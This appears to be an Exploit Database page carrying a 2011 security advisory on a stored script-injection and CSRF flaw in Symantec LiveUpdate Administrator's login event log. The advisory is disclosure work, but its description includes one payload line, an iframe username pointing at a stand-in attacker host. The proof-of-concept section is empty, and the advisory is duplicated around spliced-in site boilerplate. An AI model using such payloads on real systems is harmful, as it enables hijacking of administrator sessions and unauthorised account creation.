# Symantec LiveUpdate Administrator Management GUI - HTML Injection

#### EDB-ID:

###### 17026

#### CVE:

###### [2011-1524](https://nvd.nist.gov/vuln/detail/CVE-2011-1524) [2011-0545](https://nvd.nist.gov/vuln/detail/CVE-2011-0545)

**EDB Verified:**

#### Author:

###### [Nikolas Sotiriu](/?author=1863)

#### Type:

###### [webapps](/?type=webapps)

**Vulnerable App:**

```
source: https://www.securityfocus.com/bid/46856/info

Symantec LiveUpdate Administrator is prone to an HTML-injection vulnerability.

Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected application, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Title: Symantec LiveUpdate Administrator CSRF
vulnerability
Severity: Medium
Advisory ID: NSOADV-2011-001
Found Date: 14.07.2010
Date Reported: 17.01.2011
Release Date: 22.03.2011
Author: Nikolas Sotiriu
Mail: nso-research at sotiriu.de
Website: http://sotiriu.de/
Twitter: http://twitter.com/nsoresearch
Advisory-URL: http://sotiriu.de/adv/NSOADV-2010-001.txt
Vendor: Symantec (http://www.symantec.com/)
Affected Products: Symantec LiveUpdate Administrator <= 2.2.2.9
Remote Exploitable: Yes
Local Exploitable: No
CVE-ID: CVE-2011-0545
Patch Status: Vendor released an patch
Discovered by: Nikolas Sotiriu
Disclosure Policy: http://sotiriu.de/policy.html
Thanks to: Thierry Zoller: For the permission to use his
Policy
Background:
===========
The Symantec LiveUpdate Administrator is an enterprise Web application
that allows you to manage Symantec updates on multiple internal Central
LiveUpdate servers, called Distribution Centers. Using the Symantec
LiveUpdate Administrator, you download updates to the Manage Updates
folder, and then publish the updates to production distribution servers
for LiveUpdate clients to download, or to testing distribution centers,
so that the updates can be tested before they are published to production.
You can download and publish updates on schedule, allowing you to create
a low maintenance, reliable system that can be set up once, and then run
automatically. Updates can also be manually downloaded and published as
needed.
(Product description from LUA Admin Guide)
Description:
============
The webfrontend do not properly sanitize some variables before being
returned to the user.
If an attacker supplies a username, containing script code, at the
login-page of the service, an entry in the Event Log is done, containing
the "user name".
If the admin user is viewing the logfile, the script code will be
executed.
This can be exploited to execute arbitrary HTML and script code in a
admin's browser session in context of the Web Administrator frontend.
If an attacker passes a user name like
<iframe src=http://attacker/evil.html>
in the username field he can execute CSRF attacks against the
Webfrontend to change the settings.
The Proof of Concept code addes an admin account or executes an alert box.

Title: Symantec LiveUpdate Administrator CSRF
vulnerability
Severity: Medium
Advisory ID: NSOADV-2011-001
Found Date: 14.07.2010
Date Reported: 17.01.2011
Release Date: 22.03.2011
Author: Nikolas Sotiriu
Mail: nso-research at sotiriu.de

Advisory-URL: http://sotiriu.de/adv/NSOADV-2010-001.txt
Vendor: Symantec (http://www.symantec.com/)
Affected Products: Symantec LiveUpdate Administrator <= 2.2.2.9
Remote Exploitable: Yes
Local Exploitable: No
CVE-ID: CVE-2011-0545
Patch Status: Vendor released an patch
Discovered by: Nikolas Sotiriu
Disclosure Policy: http://sotiriu.de/policy.html
Thanks to: Thierry Zoller: For the permission to use his
Policy
Background:
===========
The Symantec LiveUpdate Administrator is an enterprise Web application
that allows you to manage Symantec updates on multiple internal Central
LiveUpdate servers, called Distribution Centers. Using the Symantec
LiveUpdate Administrator, you download updates to the Manage Updates
folder, and then publish the updates to production distribution servers
for LiveUpdate clients to download, or to testing distribution centers,
so that the updates can be tested before they are published to production.
You can download and publish updates on schedule, allowing you to create
a low maintenance, reliable system that can be set up once, and then run
automatically. Updates can also be manually downloaded and published as
needed.
(Product description from LUA Admin Guide)
Description:
============
The webfrontend do not properly sanitize some variables before being
returned to the user.
If an attacker supplies a username, containing scriptcode, at the
login-page of the service, an entry in the Event Log is done, containing
the "username".
If the admin user is viewing the logfile, the scriptcode will be
executed.
This can be exploited to execute arbitrary HTML and script code in a
admin's browser session in context of the Web Administrator frontend.
If an attacker passes a username like
in the username field he can execute CSRF attacks against the Webfrontend
to change the settings.
The Proof of Concept code addes an admin account or executes an alert box.
Proof of Concept :
